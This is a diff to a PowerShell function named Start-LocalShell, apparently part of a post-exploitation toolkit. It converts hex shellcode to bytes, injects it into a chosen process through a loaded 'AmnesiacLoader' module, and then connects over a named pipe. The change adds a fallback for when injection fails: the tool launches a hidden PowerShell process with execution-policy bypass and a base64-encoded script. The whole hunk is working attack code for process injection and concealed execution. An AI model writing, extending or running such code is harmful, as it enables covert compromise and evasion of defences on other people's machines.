@@ -2522,10 +2522,16 @@ function Start-LocalShell {
             $hexSC   = (ShellGen -ShCommand $built.FullCommand).Trim()
             $scBytes = [byte[]]@(for ($i = 0; $i -lt $hexSC.Length; $i += 2) { [Convert]::ToByte($hexSC.Substring($i, 2), 16) })
             Write-Host " [*] Injecting into PID $targetPid via AmnesiacLoader..." -ForegroundColor Cyan
+            $_injOk = $false
             try {
-                $_alMig.GetType("$_alNs.$_alInj").GetMethod("InjectShellcode").Invoke($null, @([int]$targetPid, [byte[]]$scBytes))
-            } catch { Write-Host " [-] Injection failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
-            Write-Host " [+] Injected. Connecting to pipe $PN (15s timeout)..." -ForegroundColor Green
+                $_injOk = $_alMig.GetType("$_alNs.$_alInj").GetMethod("InjectShellcode").Invoke($null, @([int]$targetPid, [byte[]]$scBytes))
+            } catch {}
+            if (-not $_injOk) {
+                Write-Host " [!] Injection failed (no SeDebugPrivilege?) — spawning hidden PS process instead." -ForegroundColor Yellow
+                $b64enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($built.RawScript))
+                Start-Process powershell.exe -ArgumentList "-ep bypass -nop -w hidden -enc $b64enc" -WindowStyle Hidden
+            }
+            Write-Host " [+] Connecting to pipe $PN (15s timeout)..." -ForegroundColor Green
             Start-Sleep -Seconds 2
             try {
                 $mgClient = New-Object System.IO.Pipes.NamedPipeClientStream('.', $PN, [System.IO.Pipes.PipeDirection]::InOut)
